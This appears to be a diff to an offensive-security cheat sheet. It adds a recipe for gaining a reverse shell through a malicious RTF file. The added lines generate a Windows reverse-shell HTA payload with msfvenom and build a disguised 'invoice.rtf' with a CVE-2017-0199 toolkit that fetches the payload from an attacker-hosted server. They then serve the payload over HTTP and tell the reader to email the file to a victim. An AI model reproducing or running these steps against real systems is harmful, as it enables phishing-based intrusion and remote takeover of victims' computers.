@@ -128,3 +128,19 @@ Tools -> Customize -> OpenDocument -> Assign Macro
 Tools -> Macro -> Organize Macro -> Basic -> choose the file -> New -> NewModuleName
 Save as odt file
 ```
+### Sending malicious rtf file to get revshell
+```
+1. msfvenom -p windows/shell_reverse_tcp LHOST=listener LPORT=445 -f hta-psh -o msfv.hta
+
+2. python2 cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.4/msfv.hta -t rtf -x 0
+
+-M gen - generate document
+-w invoice.rtf - output file name
+-u http://10.10.14.3/msfv.hta - url to get the hta from
+-t rtf - create rtf document (as opposed to ppsx)
+-x 0 - disable rtf obfuscation
+
+3. python3 -m http.server 80 for getting msfv.hta
+
+send email with the rtf attachment, if the victim clicks the invoice.rtf, u will receive revshell
+```
